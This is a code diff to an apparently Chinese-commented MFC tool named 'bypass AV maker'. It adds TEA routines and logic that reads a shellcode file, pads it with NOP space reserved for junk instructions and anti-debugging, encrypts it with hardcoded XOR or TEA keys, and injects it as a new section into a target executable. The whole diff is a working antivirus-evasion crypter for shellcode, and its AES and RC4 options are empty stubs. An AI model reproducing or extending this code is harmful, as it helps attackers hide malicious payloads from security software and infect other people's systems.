@@ -177,6 +177,239 @@ HCURSOR CbyPassAVMakeDlg::OnQueryDragIcon()
 }
 
 
+//自定义加密算法基算法
+void CbyPassAVMakeDlg::encrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
+{
+	unsigned long code[4];
+	register unsigned long i = 0x10, j = 0, m, n;
+
+	m = htonl(in[0]);
+	n = htonl(in[1]);
+	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
+	code[2] = htonl(key[2]); code[3] = htonl(key[3]);
+	while (i-- > 0) {
+		j += 0xab451fc4;
+		m += ((n >> 5) + code[1]) ^ ((n << 4) + code[0]) ^ (j + n);
+		n += ((m >> 5) + code[3]) ^ ((m << 4) + code[2]) ^ (j + m);
+	}
+	out[0] = htonl(m);
+	out[1] = htonl(n);
+}
+
+void CbyPassAVMakeDlg::decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
+{
+
+	unsigned long code[4];
+	register unsigned long n = 0x10, sum, y, z, delta = 0xab451fc4;
+
+	sum = delta * n;
+	y = htonl(in[0]);
+	z = htonl(in[1]);
+
+	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
+	code[2] = htonl(key[2]); code[3] = htonl(key[3]);
+
+	while (n-- > 0)
+	{
+		z -= ((y >> 5) + code[3]) ^ ((y << 4) + code[2]) ^ (sum + y);
+		y -= ((z >> 5) + code[1]) ^ ((z << 4) + code[0]) ^ (sum + z);
+		sum -= delta;
+	}
+	out[0] = htonl(y);
+	out[1] = htonl(z);
+}
+
+//自定义加密算法
+void CbyPassAVMakeDlg::tea_encrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
+{
+	register int m, i, j, count, p = 1;
+	unsigned char q[12], * q1, * q2, * inp;
+	unsigned char mkey[8];
+
+	m = (inlen + 10) % 8;
+	if (m)  m = 8 - m;
+
+	*outlen = m + 3 + inlen;
+	if (*outlen % 8 != 0)
+	{
+		*outlen = (*outlen / 8 + 1) * 8;
+	}
+	*out = (unsigned char*)malloc(*outlen);
+	memset(*out, 0, *outlen);
+
+	q[0] = (rand() & 0xf8) | m;
+	i = j = 1;
+	while (m > 0) {
+		q[i++] = rand() & 0xff;
+		m--;
+	}
+	count = 0;
+	q2 = q1 = *out;
+	memset(mkey, 0, sizeof(mkey));
+	while (p <= 2) {
+		if (i < 8) {
+			q[i++] = rand() & 0xff;
+			p++;
+		}
+		if (i == 8) {
+			for (i = 0; i < 8; i++)
+				q[i] ^= mkey[i];
+			encrypt_tea((unsigned long*)q, (unsigned long*)key, (unsigned long*)(*out));
+			for (i = 0; i < 8; i++)
+				q1[i] ^= mkey[i];
+			q2 = q1;
+			q1 += 8;
+			count += 8;
+			memcpy(mkey, q, 8);
+			j = i = 0;
+		}
+	}
+	inp = in;
+	while (inlen > 0) {
+		if (i < 8) {
+			q[i] = inp[0];
+			inp++;
+			i++;
+			inlen--;
+		}
+		if (i == 8) {
+			for (i = 0; i < 8; i++) {
+				if (j) q[i] ^= mkey[i];
+				else q[i] ^= q2[i];
+			}
+			j = 0;
+			encrypt_tea((unsigned long*)q, (unsigned long*)key, (unsigned long*)q1);
+			for (i = 0; i < 8; i++)
+				q1[i] ^= mkey[i];
+			count += 8;
+			memcpy(mkey, q, 8);
+			q2 = q1;
+			q1 += 8;
+			i = 0;
+		}
+	}
+	p = 1;
+	while (p < 8) {
+		if (i < 8) {
+			memset(q + i, 0, 4);
+			p++;
+			i++;
+		}
+		if (i == 8) {
+			for (i = 0; i < 8; i++)
+				q[i] ^= q2[i];
+			encrypt_tea((unsigned long*)q, (unsigned long*)key, (unsigned long*)q1);
+			for (i = 0; i < 8; i++)
+				q1[i] ^= mkey[i];
+			memcpy(mkey, q, 8);
+			count += 8;
+			q2 = q1;
+			q1 += 8;
+			i = 0;
+		}
+	}
+	_ASSERT(*outlen == count);
+}
+
+//自定义解密算法
+void CbyPassAVMakeDlg::tea_decrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
+{
+	unsigned char q[8], mkey[8], * q1, * q2, * outp;
+	register int count, i, j, p;
+
+	if (inlen % 8 || inlen < 16) return;
+	/* get basic information of the packet */
+	decrypt_tea((unsigned long*)in, (unsigned long*)key, (unsigned long*)q);
+	j = q[0] & 0x7;
+	count = inlen - j - 10;
+	*outlen = count;
+	*out = (unsigned char*)malloc(*outlen);
+	if (*out == NULL) return;
+	memset(*out, 0, *outlen);
+
+
+	if (count < 0) return;
+
+	memset(mkey, 0, 8);
+	q2 = mkey;
+	i = 8; p = 1;
+	q1 = in + 8;
+	j++;
+	while (p <= 2)
+	{
+		if (j < 8)
+		{
+			j++;
+			p++;
+		}
+		else if (j == 8)
+		{
+			q2 = in;
+			for (j = 0; j < 8; j++)
+			{
+				if (i + j >= inlen) return;
+				q[j] ^= q1[j];
+			}
+			decrypt_tea((unsigned long*)q, (unsigned long*)key,
+				(unsigned long*)q);
+			i += 8;
+			q1 += 8;
+			j = 0;
+		}
+	}
+	outp = *out;
+	while (count != 0)
+	{
+		if (j < 8)
+		{
+			outp[0] = q2[j] ^ q[j];
+			outp++;
+			count--;
+			j++;
+		}
+		else if (j == 8)
+		{
+			q2 = q1 - 8;
+			for (j = 0; j < 8; j++)
+			{
+				if (i + j >= inlen)
+					return;
+				q[j] ^= q1[j];
+			}
+			decrypt_tea((unsigned long*)q, (unsigned long*)key,
+				(unsigned long*)q);
+			i += 8;
+			q1 += 8;
+			j = 0;
+		}
+	}
+	for (p = 1; p < 8; p++)
+	{
+		if (j < 8)
+		{
+			if (q2[j] ^ q[j])
+				return;
+			j++;
+		}
+		else if (j == 8)
+		{
+			q2 = q1;
+			for (j = 0; j < 8; j++)
+			{
+				if (i + j >= inlen)
+					return;
+				q[j] ^= q1[j];
+			}
+			decrypt_tea((unsigned long*)q, (unsigned long*)key,
+				(unsigned long*)q);
+			i += 8;
+			q1 += 8;
+			j = 0;
+		}
+	}
+}
+
+
 //确定按钮事件
 void CbyPassAVMakeDlg::OnBnClickedButton1()
 {
@@ -188,12 +421,13 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 		AfxMessageBox("区段名为空!");
 		return;
 	}
+	//计算花指令，反调试代码预留空间
 	STu32 nopbytes = 0;
 	CString strNopBytes;
 	mCodesLen.GetWindowText(strNopBytes);
 	nopbytes = strtoll(strNopBytes, 0, 0x10);
 
-	//加载bin文件数据
+	//加载bin文件shellcode数据
 	CString binFile = "";
 	mFileBin.GetWindowTextA(binFile);
 	HANDLE mHandle = CreateFile(binFile.GetBuffer(0), GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -203,15 +437,16 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 		return;
 	}
 
-	DWORD dwSizeHigh = 0, dwSizeLow = 0;
-	dwSizeLow = GetFileSize(mHandle, &dwSizeHigh);
-	if (dwSizeLow == INVALID_FILE_SIZE || dwSizeHigh != 0)
+	DWORD dwSizeHigh = 0, dwShellCodeSize = 0;
+	dwShellCodeSize = GetFileSize(mHandle, &dwSizeHigh);
+	if (dwShellCodeSize == INVALID_FILE_SIZE || dwSizeHigh != 0)
 	{
 		CloseHandle(mHandle);
 		AfxMessageBox("文件太大!");
 		return;
 	}
-	STu8* pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, dwSizeLow);
+	STu32 dwVirMemSize = dwShellCodeSize + nopbytes;
+	STu8* pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, __int64(dwVirMemSize));
 	if (pVirMem == NULL)
 	{
 		CloseHandle(mHandle);
@@ -220,14 +455,74 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 	}
 
 	DWORD readsize;
-	if (!ReadFile(mHandle, pVirMem, dwSizeLow, &readsize, NULL))
+	if (!ReadFile(mHandle, pVirMem + nopbytes, dwShellCodeSize, &readsize, NULL))		//跳过nopbytes花指令
+	{
+		CloseHandle(mHandle);
+		AfxMessageBox("文件读取失败!");
+		return;
+	}
+
+	if (readsize != dwShellCodeSize)
 	{
 		CloseHandle(mHandle);
 		AfxMessageBox("文件读取失败!");
 		return;
 	}
 	CloseHandle(mHandle);
-	bool bRet = mPEMake.AddSectionToEnd((STu8*)strName.GetBuffer(0), pVirMem, readsize, IMAGE_SCN_MEM_READ| IMAGE_SCN_MEM_WRITE);
+
+	//处理shellcode数据，增加花指令,暂时填充NOP
+	if(nopbytes)
+		memset(pVirMem, 0x90, nopbytes);
+
+	//处理shellcode数据，加密shellcode代码
+
+	if (IsDlgButtonChecked(IDC_CHECK1))
+	{
+		//xor加密
+		STu8 XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
+		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
+		for(int i = 0; i < dwVirMemSize; i++)
+		{
+			pVirMem[i] ^= XOR_BYTES[i % XOR_BYTES_LEN];
+		}
+	}
+	else if (IsDlgButtonChecked(IDC_CHECK2))
+	{
+		//aes加密
+		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+	}
+	else if (IsDlgButtonChecked(IDC_CHECK3))
+	{
+		//RC4加密
+		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+	}
+	else if (IsDlgButtonChecked(IDC_CHECK4))
+	{
+		//tea加密
+		STu8 TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+		unsigned char* out = 0;
+		unsigned int outlen = 0;
+		tea_encrypt(pVirMem, dwVirMemSize, TEA_KEY, &out, &outlen);
+		MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
+		dwVirMemSize = outlen;
+		pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, dwVirMemSize);
+		if (pVirMem == NULL)
+		{
+			AfxMessageBox("内存分配失败!");
+			return;
+		}
+		memcpy(pVirMem, out, dwVirMemSize);
+
+		//解密测试
+		//unsigned char* out2 = 0;
+		//unsigned int outlen2 = 0;
+		//tea_decrypt(out, outlen, TEA_KEY, &out2, &outlen2);
+		free(out);
+		//free(out2);
+	}
+
+	//shellcode数据添加到目标程序新区段
+	bool bRet = mPEMake.AddSectionToEnd((STu8*)strName.GetBuffer(0), pVirMem, dwVirMemSize, IMAGE_SCN_MEM_READ| IMAGE_SCN_MEM_WRITE);
 	if (bRet)
 	{
 		OnSaveAs();
